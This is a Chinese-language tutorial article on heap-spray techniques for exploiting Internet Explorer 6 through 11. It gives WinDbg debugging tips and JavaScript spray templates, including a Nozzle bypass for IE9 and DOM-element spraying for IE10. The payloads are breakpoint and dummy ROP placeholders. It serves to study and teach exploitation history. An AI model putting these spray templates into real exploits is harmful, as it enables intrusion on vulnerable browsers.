
# 【技术分享】IE浏览器漏洞综合利用技术：堆喷射技术


                                阅读量   
                                **184204**
                            
                        |
                        
                                                                                                                                    ![](./img/85782/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](./img/85782/t0152d70af042826f33.jpg)](./img/85782/t0152d70af042826f33.jpg)



作者：[Ox9A82](http://bobao.360.cn/member/contribute?uid=2676915949)

稿费：400RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

<br>

**0.前言**

浏览器曾经是漏洞肆虐的重灾区，在IE6时代往往一不留神打开一个页面就会中招。甚至在web渗透圈子中也流传过“拿shell 挂网马”这样一句话。那么这种情况是什么时候得到改观的呢？我个人觉得应该与IE8的出现脱离不开关系，IE8与前几代的最大不同在于它首次支持了DEP和ASLR保护。对漏洞攻防有了解的同学应该知道ASLR早在2007年就已经发布了，而DEP更是可以追溯到xp时代，但是微软出于各种考虑并没有在IE浏览器中启用这些保护，直到IE8的发布。彼时ASLR加上DEP的强强联合曾被认为是牢不可破的马奇诺防线，这种看法在现在看来当然是很可笑的。这让我们认识到漏洞攻防是一种此消彼长的技术、是一种动态平衡，从来不存在绝对的安全。

[![](./img/85782/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01c3229c34d72efabb.jpg)

IE浏览器攻防史上的一个重要事件应该是Pwn2Own 2010的赛场上Peter Vreugdenhil对具有ASLR、DEP保护的IE8浏览器的攻击。在这次利用中，Peter Vreugdenhil使用OOB漏洞结合对象的结构进行信息泄漏，这种手法的思想在现在依然在应用。

从2010年的IE8到2015年的IE11，IE浏览器的攻防技术在短短5年内发展的极为迅速也极为精彩，让我们感受到了攻防对抗的魅力。随着Edge浏览器的发布，IE的攻防对抗可能要落下帷幕了，但是攻防向前发展的脚步却不会停下，Edge其实是延续了这种对抗技术。

在这系列文章中，我们会从最初的IE6“远古时代”开始讲起，会涉及到时间长河中出现的各种利用手段。就像仙果所说，浏览器漏洞利用从最初的“暴力”、“野蛮”逐步发展到了如今的“优雅”和“科幻”。

这系列文章主要目的是做一个技术总结。内容包含比较多，从信息泄露到漏洞利用，从各种缓解措施的绕过到最新保护措施的介绍，在完成这篇文章的过程中我阅读了大量国内外的文档，深感国内的中文资料不是很多，自己也着手翻译了一些。



**1.概述**

堆喷射是一种极具历史感的技术，第一次出现是在2001年。堆喷射最初的使用目的仅仅是为了给一些漏洞利用提供一个稳定的可以存放shellcode的地址，诸如在栈溢出利用中使用堆喷射放置shellcode然后劫持返回地址进行跳转（无dep情况）。堆喷射第一次在IE浏览器上的应用出现于CVE-2004-1050的exploit中，采用的是极其经典的nops+shellcode的方式。此后结合千疮百孔的ActiveX，诸如栈溢出，漏洞利用的成本着实相当之低。

但是随着2007年ASLR出现之后，这种“老旧”的技术又焕然新生了。尤其是对于IE浏览器、Adobe Reader等软件来说，因为它们支持内嵌执行javascript为攻击者提供了动态分配内存的途径。随着攻防技术的发展，微软以及第三方安全厂商都曾开发过一些堆喷射的缓解措施，所以对于不同的版本来说有不同的堆喷射方法，一旦一种喷射方法被厂商封堵之后，聪明的Hacker们总能想出新的途径进行喷射。

**<br>**

**2.基础知识**

IE浏览器下的堆喷射一般都是通过js实现的。所谓堆喷射(Heap spray)指的就是通过大量分配内存来填充进程地址空间以便于进一步利用的手段。

在调试堆喷射代码时需要注意的一点是，在调试态下堆内存的分配布局和正常情况下是可能会有差异的，所以不能直接使用调试器附加进程来调试堆喷代码。我们需要等堆喷射完成之后再去附加IE进程，才能得到准确的堆空间布局。同时因为堆的分布不均衡（存在碎片），所以最先分配的一些堆块的地址可能是无规律的，但是如果大量的分配堆块的话，那么就会出现稳定的地址分布。

[![](./img/85782/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t019823b11b2c71cad1.jpg)

**<br>**

**3.如何调试堆喷射**

关于调试器的选择，我个人认为应该使用Windbg，虽然也可以使用Immunity Debugger或是OllyDbg，但是个人觉得调试微软的程序还是Windbg更好用也更稳定一些。

Windbg有一些非常强大的调试命令，这里介绍一些调试漏洞时很有用的命令，这些命令可能暂时用不到但在后面的文章中用到，这里一并给出。

首先是gflags.exe，gflags.exe其实是Windbg自带的一个可执行文件，用于启用一些微软提供的一些调试支持，gflags的原理其实非常简单因为这些调试支持的设置实际上是在注册表中的，我们手动修改注册表的效果其实也是一样的。对于IE漏洞调试来说最有用的调试选项就是UST和HPA。其中，UST是堆分配记录，只要开启了这个选项每一块堆的分配都会记录在进程中，之后如果想要知道一个堆是在哪里分配的只要使用一条命令!heap -p -a即可。HPA是调试堆，只要启用了HPA选项，堆的结构会发生变化，增加额外的检查字段，并且堆的附近内存页变的不再可读可写，这样一旦发生了堆溢出、越界访问或是UAF就可以在第一时间发现并抛出异常。至于更多的选项，我推荐阅读张银奎老师的《软件调试》或者我的博客里简单的记录了一些[http://www.cnblogs.com/Ox9A82/p/5603172.html](http://www.cnblogs.com/Ox9A82/p/5603172.html) 。



```
!heap也有一些很好用的命令
!heap -stat 显示进程中所有堆的信息，通过这个命令可以找到堆喷分配内存块所属的堆
!heap -a HEAP_HANDLE 显示指定句柄的堆的情况
!heap -stat -h HEAP_HANDLE 可以看到堆中块的分布情况
!heap -flt s size 显示所有指定大小的块
!heap -p -a 堆分配记录
```

ln 列出附近的符号，这条命令在调试IE漏洞时相当有用，我们后面就可以看到



```
sxe ld:module_name 当模块加载时断下
ba address 多功能断点，大家可能比较熟悉bp断点，ba相比bp可以自由指定断下的访问操作
bu address 对符号下断，这条命令在调试IE漏洞时相当有用，断下的位置是根据符号确定的
x name 搜索符号，可以用于查找模块中的函数名，非常有用
```

关于如何调试POC

由于我们是处于浏览器中的缘故，我们并不能够做到直接调试javascript脚本。为此Hacker们想出一些很巧妙的解决方案，其中最常用的就是使用Javascript中的数学函数辅助下断，诸如Math.cos()、Math.sin()、Math.tan()、Math.asin()、Math.acos()、Math.atan()等函数。这些函数的优点是直接对应于jscript!cos、jscript!sin、jscript!tan、jscript!asin、jscript!acos、jscript!atan等调试符号。我们可以在POC中插入这些数学函数，来实现对POC进行调试。

此外如果你对mshtml的一些基本结构诸如CTreeNode、CTreePos有所了解的话，那么调试的效率会更高。

这里我初步的介绍了一些调试浏览器漏洞的小技巧，如果你完全没有接触过漏洞的调试，那么我推荐你看一下泉哥的《漏洞战争:软件漏洞分析精要》。

**<br>**

**4.堆喷射需要考虑什么**

在介绍实际的喷射手法之前我们先想一想，堆喷射要考虑哪些问题？

最容易想到的就是应该用什么来填充。

其次会想到，多大的填充尺寸可以达到目标地址。

再次是每个基本单位应该要多大，才能够准确又稳定的填充。

接下来我们会看到这些实际的喷射手法就是对这些问题的解决。

**<br>**

**5.XP+IE6环境下的堆喷射**

IE6浏览器的堆喷射是使用Javascript String对象进行的。

IE6下的堆喷射是最原始的一种，因为IE6那个时期是没有任何漏洞缓解措施的，所以只需要考虑如何分配内存即可。

从代码执行的角度来看，IE6时期我们的利用主要分为两类。第一类是ActiveX类的漏洞，而且以栈溢出为常见。第二类是IE6本身的UAF漏洞。第一类漏洞只需要一个大致的地址+合适的nop跳板就可以实现最终的利用。至于第二类通常会使用一个固定的跳板地址，诸如著名的0x0C0C0C0C，关于它的原理我们之后再讲，这里我们也可以认为它只需要一个大致的地址就可以。

但是由于IE6中javascript的实现，使得字符串赋值给一个变量时并不会开辟新的内存空间（类似于C中的指针取地址），只有当字符串发生连接操作时（substr或是+），才会为字符串开辟新的内存空间。



```
for (i = 0 ; i &lt; 1000 ; i++)
     heap_chunks[i] = chunk+junk;
```

下面给出了堆喷的测试代码，其中每一个块的大小是0x80000(每个字符两个字节)，为什么要取0x80000的大小呢？这是我们在前面提出的问题，其实取别的大小我认为也是可以的，单个块的大小和分配的块数是一种综合的考量，主要是要考虑到内存块分配的速度和内存布局的稳定性。至于为什么这个数是0x40000我也不知道，只能说是前辈们在不断尝试中获得的经验，下面是一个堆喷射的示例代码：



```
&lt;html&gt;
&lt;SCRIPT language="JavaScript"&gt; 
var sc = unescape("%ucccc%ucccc"); 
var nop = unescape("%u0c0c%u0c0c");
while (nop.length &lt; 0x40000) 
    nop += nop; 
nop = nop.substring(0,0x40000-0x20-sc.length); 
heap_chunks = new Array(); 
for (i = 0 ; i &lt; 500 ; i++) 
    heap_chunks[i] = nop+sc;
&lt;/SCRIPT&gt;
&lt;/html&gt;
```

你是否注意到了“0x40000-0x20-sc.length”？

因为js中字符串对象不是简单的Unicode。它是一种复合的字符串结构，称为BSTR，这一数据类型包含有数据长度域、数据域和一个终止符。

4个字节的size域描述字符串的字节数，但是不包含结束符

n个字节的string主体（Unicode格式）

2个字节的x00x00结束符

值得注意的是BSTR并不是javascript定义的，恰恰相反BSTR是微软官方定义的，可以直接在MSDN中查到（https://msdn.microsoft.com/en-us/library/windows/desktop/ms221069(v=vs.85).aspx）

并且可能是通过oleaut32.dll进行分配的

（[https://msdn.microsoft.com/en-us/library/ms923851.aspx](https://msdn.microsoft.com/en-us/library/ms923851.aspx)  ）

参加MSDN的示例：

```
BSTR MyBstr = SysAllocString(L"I am a happy BSTR");
```

我们试图把内存喷射到0x0C0C0C0C，经过简单的计算可知0x0C0C0C0C约为202116108个字节。 500*0x80000约为262144000个字节，262144000大于202116108个字节，因此我们的喷射一定可以到达0x0C0C0C0C。

根据这种算法我们可以得出

```
0x0A0A0A0A（160M） 0x0C0C0C0C（192M） 0x0D0D0D0D（208M）
```

[![](./img/85782/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0193c1ff15749f7a51.png)

任务管理器中内存曲线突出的部分就是堆喷导致的

**<br>**

**6.Win7+IE8环境下的堆喷射**

IE8相比IE6来说并没有在堆喷射方面做任何的限制，因此我们可以同样通过Javascript String对象进行喷射。

但是在代码执行的角度来看，IE8浏览器支持了ASLR和DEP这两个重要的漏洞环境措施，因此我们堆喷射策略也要进行调整。这一时期的堆喷射关键字是精准，要求能够准确预测到喷射的位置，甚至一个字节都不可以差。至于必须这样的原因，我会在利用部分讲，这里只需要知道此时要求精准喷射。

此外还有一点是IE8下需要把以前的连接语句换成substring()才能实现内存分配，这个没什么好说的。



```
&lt;html&gt;
&lt;SCRIPT language="JavaScript"&gt; 
var sc = unescape("%ucccc%ucccc"); 
var nop = unescape("%u0c0c%u0c0c");
while (nop.length &lt; 0x100000) 
    nop += nop; 
nop = nop.substring(0,(0x80000-6)/2); 
code = nop; 
heap_chunks = new Array(); 
for (i = 0 ; i &lt; 1000 ; i++) 
    heap_chunks[i] = code.substring(0, code.length);
&lt;/SCRIPT&gt;
&lt;/html&gt;
```

这一种技术很有可能是Pwn2Own 2010的获胜者Peter Vreugdenhil发明的

(参见[http://vreugdenhilresearch.nl/Pwn2Own-2010-Windows7-InternetExplorer8.pdf](http://vreugdenhilresearch.nl/Pwn2Own-2010-Windows7-InternetExplorer8.pdf) )

Peter Vreugdenhil发现当堆块进行大量分配的时候，地址分配的熵处于高位并且是对齐的。就是说堆地址的低位不会发生变化，仅有几个高字节是改变的，为此Peter Vreugdenhil给出了一个例子



```
Heap alloc size(0x7ffc0) allocated at 063d0020
Heap alloc size(0x7ffc0) allocated at 06450020
Heap alloc size(0x7ffc0) allocated at 064d0020
Heap alloc size(0x7ffc0) allocated at 06550020
Heap alloc size(0x7ffc0) allocated at 065d0020
Heap alloc size(0x7ffc0) allocated at 06650020
Heap alloc size(0x7ffc0) allocated at 066d0020
```

利用这一点，如果我控制我分配的堆块大小为0x10000。因为低位不变，那么无论如何我们都可以成功的指向我们想要的地址。举个例子，假如我们在第一次运行中，0x0c0c0c0c属于开始地址在0x0c0c0018的堆块、第二次，0x0c0c0c属于开始地址在0x0c080018的块、第三次处于0x0c030018。因为块是对齐的，只要块的大小可以控制为0x10000的基数就可以，比如0×1000、比如0x5000、比如0x10000。这样一来，我们就可以控制0x0c0c0c0c处的内容始终指向rop链第一条语句了。

我在这里使用后面提到的shellcode.substring(0, (0x80000-6)/2);进行分配，分配结果如下图

[![](./img/85782/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01630470d90afad678.jpg)

接下来我们只需要计算目的地址与rop首语句之间的差值即可把eip准确的指向rop链了。

**<br>**

**7.IE9环境下的堆喷射**

历史的轮盘转到了IE9的时代，微软为了阻止攻击者进行堆喷射在IE9中增加了Nozzle缓解机制，Nozzle缓解机制会检测到堆喷中分配的相同占位块从而导致堆喷失败。但是由于Nozzle的判断机制非常简单，因此只要堆喷的每个堆块有略微的不同比如加入随机数，甚至只需要改变一个字节就可以绕过Nozzle缓解机制的检测，成功实现堆喷。

其实，这里还有一个隐含的意思不知道你有没有意识到，那就是对于具有DEP环境下的堆喷射来说，除了我们布置的payload本身之外其它的部分已经没有什么意义了。我们既不需要它们作为跳板，也不指望它们可以实现什么，因为这部分的内容完全就是随意的，我们可以生成一些随机数或其它的随机内容填充这一部分来使得每个块内容都不同。如果你没能理解这句话意思，那么没关系我们会在后面利用部分详述。

这里展示了如何把IE8下的堆喷代码修改成IE9适用的以绕过Nozzle。



```
&lt;html&gt;
&lt;SCRIPT language="JavaScript"&gt; 
var sc = unescape("%ucccc%ucccc"); 
var nop = unescape("%u0c0c%u0c0c");
while (nop.length &lt; 0x100000) 
    nop += nop; 
nop=nop.substring(0, (0x40000-6)/2); 
heap_chunks = new Array(); 
for (i = 0 ; i &lt; 1000 ; i++) 
{
    code=nop+i;
    heap_chunks[i] = code.substring(0, code.length);
}
&lt;/SCRIPT&gt;
&lt;/html&gt;
```

我们这里演示了堆喷射的结果，如下图

[![](./img/85782/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0148761a931e416814.png)

**<br>**

**8.IE10环境下的堆喷射**

到了IE10这里，情况就有一些不一样了。IE10浏览器中禁止了喷射BSTR（javascript string）的操作，这意味着自IE6发展而来的堆喷射方法已经不再奏效了，我们以前的那些方法都不能在IE10浏览器下成功进行喷射。在这种情况下，一种被称为DOM Element Property Spray（简称DEPS）的技术由Corelan Team提了出来（https://www.corelan.be/index.php/2013/02/19/deps-precise-heap-spray-on-firefox-and-ie10/）

这项技术可以说是源自联想和类比，因为我们在对UAF漏洞进行利用时通常都会使用标签进行占位（后面介绍利用的文章中会详述），既然创建标签可以分配内存那么根据这种情况我们会联想到是否可以通过标签进行喷射。

DEPS技术的思想正是创建大量的DOM元素（标签），通过DOM元素去喷射内存，并且通过设置DOM元素的属性来设置堆喷内存的内容。

并且由于内存布局的不同的原因，在IE10下0x20302228是一个稳定且便于到达的地址。而且利用DOM喷射一个比较凑巧的优点就是不需要刻意的绕Nozzle缓解机制，其本身就不受Nozzle的影响。下面是一个展示堆喷射效果的DEMO，因为IE10浏览器是随着Windows8一起发布的，所以我们这里使用Windows8作为测试环境。



```
&lt;html&gt; 
&lt;head&gt;&lt;/head&gt; 
&lt;body&gt; 
&lt;div id='blah'&gt;&lt;/div&gt; 
&lt;script language='javascript'&gt; 
         var div_container = document.getElementById('blah'); 
         div_container.style.cssText = "display:none"; 
         var data; 
         offset = 0x104; 
         junk = unescape("%u2020%u2020"); 
         while(junk.length &lt; 0x1000) 
             junk+=junk;          
            rop = unescape("%u4141%u4141%u4242%u4242%u4343%u4343%u4444%u4444%u4545%u4545%u4646%u4646%u4747%u4747"); 
         shellcode = unescape("%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc%ucccc"); 
         data = junk.substring(0,offset) + rop + shellcode; 
         data += junk.substring(0,0x800-offset-rop.length-shellcode.length); 
         while(data.length &lt; 0x80000) data += data; 
         for (var i=0; i &lt; 0x500; i++) 
         { 
                 var obj = document.createElement("button"); 
                 obj.title = data.substring(0,0x40000-0x58); 
                 div_container.appendChild(obj); 
         } 
&lt;/script&gt; 
&lt;/body&gt; 
&lt;/html&gt;
```

此外还有一个非常有趣的现象，在x64的Win8和Win8.1下，我们一般打开的IE浏览器实际上都是32位的。那么你可能有疑问，因为IE明明提供了64位和32位两个版本，为什么我们打开的都是32位的？事实上64位版本是专为Metro界面提供的，如果你从Metro启动IE就会发现它是64位的。我发现这一点是因为我一直使用的是32位的windbg，32位的windbg是调试不了64位进程的，我在调试时发现有时候IE进程可以附加有时候不可以附加，后来查了一下资料才发现是这么回事。

IE10的64位进程与32位进程

[![](./img/85782/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01d507a2cc8fd26eb1.png)

[![](./img/85782/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t010e684712cc643aa9.png)

<br>

**9.IE11环境下的堆喷射**

IE11是IE浏览器的终章，IE11与Widows8.1系统同时发布。

其实单纯说喷射的话与IE10相似，但是由于IE11浏览器已经加入了很多新的漏洞缓解措施，出于漏洞利用的考虑我们此时单独讨论堆喷射已经没有什么意义了。换而言之，此时喷射内存的目的已经与之前完全不同了。

我们会在后面的利用部分讨论IE11中进行jscript9 Heap Feng shui布局的意义。

<br>

**10.使用Heaplib进行堆喷射**

Heaplib是一个方便进行精准堆喷射的库。

由于IE浏览器的堆很可能存在空洞，这样的话会对我们的堆布局造成很大影响。heaplib会刷新这些缓冲块，以确保申请的块由系统堆分配。详见([http://www.phreedom.org/research/heap-feng-shui/heap-feng-shui.html](http://www.phreedom.org/research/heap-feng-shui/heap-feng-shui.html) )

但是Heaplib只在IE9以下的版本中有效，因为IE9中存在Nozzle。不过可以通过我们自己修改Heaplib来让它运行在IE9上。

<br>

**11.通过FLASH进行喷射**

大概是2014年，网上开始大量流传使用Flash内存布局结合浏览器漏洞进行利用的样本。从技术手段来说，这些使用FLASH进行内存布局的样本与我们前面讲的这些堆喷射已经不处于同一个次元了。结合Flash内存布局的利用，本质上讲是试图做一种漏洞的转化，与我们前面讲的这些喷射有本质的不同。这种技术最早应该是由李海飞前辈提出的，我们在后面利用部分会详细说这部分内容，参见

([https://docs.google.com/viewer?url=https://sites.google.com/site/zerodayresearch/smashing_the_heap_with_vector_Li.pdf?attredirects=0](https://docs.google.com/viewer?url=https://sites.google.com/site/zerodayresearch/smashing_the_heap_with_vector_Li.pdf?attredirects=0)  )

<br>

**12.常用堆喷尺寸大小**

参考自泉哥博客，这些数据应该说是前辈们的经验总结。



```
XP SP3 - IE6 block = shellcode.substring(0,0x40000-0x20)
XP SP3 – IE7 block = shellcode.substring(2,0x10000-0×21); 
XP SP3 – IE8 block = shellcode.substring(2, 0x40000-0×21); 
Vista SP2 – IE7 block = shellcode.substring(0, (0x40000-6)/2); 
Vista SP2 – IE8 block = shellcode.substring(0, (0x40000-6)/2); 
Win7 – IE8 block = shellcode.substring(0, (0x80000-6)/2); 
Vista/Win7 – IE9 block = shellcode.substring(0, (0x40000-6)/2); 
XP SP3/VISTA SP2/WIN7 - Firefox9 block = shellcode.substring(0, (0x40000-6)/2);
```



**13.x64下的堆喷射**

对x64进程进行堆喷射理论上是没有意义的，因为64位的地址表示的值过大，以我们目前的计算机配置来说就算是拿全部的内存进行喷射也不可能到达喷射需求的地址。但是在实际漏洞利用中，可能因为漏洞本身的特性导致我们可以通过小范围喷射进行利用，诸如著名的《Exploiting Internet Explorer11 64-bit on Windows 8.1 Preview》文章中的利用。

<br>

**后记**

其实这系列的文章，我在去年10月份的时候就已经写完了，但是一直在硬盘里放了近半年都没有投出来。我主要是考虑到这系列文章涉及的话题太广、内容太多、历史又太悠久，考虑到自己仅是个大二学生水平较低、接触漏洞方面也不久，唯恐内容中出现错误和纰漏。但是做了一番修改后我还是鼓起勇气发出来了，希望大家能够帮忙指出文章中错误和提出修改建议，可以通过微博私信给我 id:Ox9A82。

<br>

**reference**

《浏览器漏洞攻防对抗的艺术》仙果

[http://bbs.pediy.com/thread-211277.htm](http://bbs.pediy.com/thread-211277.htm) 

《攻破Windows 8.1的64位IE》古河

[http://www.ichunqiu.com/course/52149](http://www.ichunqiu.com/course/52149) 

《Heap Feng Shui in JavaScript》

[http://www.phreedom.org/research/heap-feng-shui/heap-feng-shui.html](http://www.phreedom.org/research/heap-feng-shui/heap-feng-shui.html) 

《DEPS —— Precise Heap Spray on Firefox and IE10》

[https://www.corelan.be/index.php/2013/02/19/deps-precise-heap-spray-on-firefox-and-ie10/](https://www.corelan.be/index.php/2013/02/19/deps-precise-heap-spray-on-firefox-and-ie10/) 

《Exploiting Internet Explorer11 64-bit on Windows 8.1 Preview》

[http://ifsec.blogspot.com/2013/11/exploiting-internet-explorer-11-64-bit.html](http://ifsec.blogspot.com/2013/11/exploiting-internet-explorer-11-64-bit.html) 

《Exploit 编写系列教程第十一篇：堆喷射技术揭秘》

[http://bbs.pediy.com/showthread.php?t=151381](http://bbs.pediy.com/showthread.php?t=151381) 

《IE Array Object Heap Spraying》

[http://www.cnblogs.com/wal613/p/3958692.html](http://www.cnblogs.com/wal613/p/3958692.html) 

《ASLR BYPASS APOCALYPSE IN RECENT ZERO-DAY EXPLOITS》

[https://www.fireeye.com/blog/threat-research/2013/10/aslr-bypass-apocalypse-in-lately-zero-day-exploits.html](https://www.fireeye.com/blog/threat-research/2013/10/aslr-bypass-apocalypse-in-lately-zero-day-exploits.html) 

《Smashing the Heap with Vector:Advanced Exploitation Technique in Recent Flash Zero-day Attack》

[https://docs.google.com/viewer?url=https://sites.google.com/site/zerodayresearch/smashing_the_heap_with_vector_Li.pdf?attredirects=0](https://docs.google.com/viewer?url=https://sites.google.com/site/zerodayresearch/smashing_the_heap_with_vector_Li.pdf?attredirects=0) 
